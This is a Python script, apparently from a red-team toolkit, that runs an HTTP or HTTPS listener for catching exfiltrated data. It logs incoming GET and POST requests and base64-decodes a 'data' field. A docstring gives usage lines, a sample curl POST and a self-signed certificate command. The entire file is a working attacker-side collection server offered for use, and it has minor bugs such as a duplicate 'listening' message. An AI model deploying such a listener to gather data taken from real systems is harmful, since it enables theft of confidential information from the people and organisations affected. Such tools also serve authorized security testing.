#!/usr/bin/python3

"""
Simple HTTP server to exfil data via GET or POST requests

- Will automatically base64 / URL decode any query parameter or JSON field with the name 'data' (if --decode used)
- For POST requests, use JSON
- If you're exfiling base64 encoded data, make sure it's in a query parameter or JSON field named 'data'
- Binds to 0.0.0.0 and port 8085 by default
- Use https with --secure (must first generate self-signed cert - see below)

Usage: 
    python3 exfil_server.py --decode
    python3 exfil_server.py -p 8080
    python3 exfil_server.py --secure
    python3 exfil_server.py -p 80 -s -d

Example POST request:
    curl -X POST http://localhost:8085/ -H "Content-Type: application/json" -d '{"data": "test123"}'

Generate self-signed cert (use with --secure):
    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
"""

from colorama import Fore, Style
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs, unquote_plus

import argparse
import base64
import json
import ssl

parser = argparse.ArgumentParser(description="Simple exfil server with optional base64 decoding")
parser.add_argument('-d', '--decode', action="store_true", help="Automatic base64 decoding of `data` field / parameter")
parser.add_argument('-p', '--port', type=int, default=8085, help="Port to listen on (default: 8085)")
parser.add_argument('-s', '--secure', action="store_true", help="Use HTTPS (generates self-signed cert)")
args = parser.parse_args()

DECODE = args.decode
PORT = args.port
SECURE = args.secure

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.handle_request("GET")

    def do_POST(self):
        self.handle_request("POST")

    def handle_request(self, method):
        ip, port = self.client_address
        time = datetime.now().strftime("%m/%d/%Y %H:%M:%S")

        print(f"\n{Fore.GREEN}[+] {method} request from {ip} @ {time}\n{Style.RESET_ALL}")

        if method == "GET":
            url = urlparse(self.path)
            print(url.query)
            # Use parse_qs to convert query string into dict
            params = parse_qs(url.query)
            if params and DECODE:
                for key, value in params.items():
                    if key == "data":
                        self.decode_data(' '.join(value))

        if method == "POST":
            content_length = int(self.headers.get('Content-Length', 0))
            content_type = self.headers.get('Content-Type', '')
            if content_length:
                body = self.rfile.read(content_length)
                print(body.decode('utf-8', errors='ignore'))

            # Decode JSON
            if "application/json" in content_type and DECODE:
                json_data = json.loads(body)
                
                if "data" in json_data:
                    self.decode_data(json_data["data"])
            
        self.send_response(200)
        self.end_headers()
            
    # Suppress the default log line that the server prints
    def log_message(self, format, *args):
        pass

    def decode_data(self, data):
        try:
            print(f"{Fore.BLUE} \n[+] Decoding Base64 data...{Style.RESET_ALL}")
            decoded = base64.b64decode(data).decode('utf-8', errors='ignore')

            url_decoded = unquote_plus(decoded)
            # Check for URL encoding by comparing the URL decoded string to the original
            if url_decoded != decoded: # If the strings don't match, URL encoding was used
                print(f"{Fore.BLUE}[+] URL encoding detected and decoded...\n{Style.RESET_ALL}")
                print(url_decoded)
            else:
                # Just base64 decoded data
                print("\n" + decoded)

        except base64.binascii.Error:
            print(f"{Fore.RED}[-] Not valid base64 (or incorrect padding) - skipping decode{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Decode failed: {e}{Style.RESET_ALL}")

# Start the server
server = HTTPServer(('0.0.0.0', PORT), RequestHandler)

if SECURE:
    try:
        # Create a TLS context
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile="./server.pem")

        # Wrap the server's socket with TLS
        server.socket = context.wrap_socket(server.socket, server_side=True)

        print(f"[+] Server listening on https://0.0.0.0:{PORT} [Ctrl-C to quit]")
    except FileNotFoundError:
        print(f"{Fore.YELLOW}[-] server.pem not found - falling back to HTTP - generate self-signed cert with:{Style.RESET_ALL}")
        print("     openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes\n")

print(f"[+] Server listening on http://0.0.0.0:{PORT} [Ctrl-C to quit]")

try:
    server.serve_forever()
except KeyboardInterrupt:
    print(f"{Fore.RED}\n\n[-] Server stopped.{Style.RESET_ALL}")
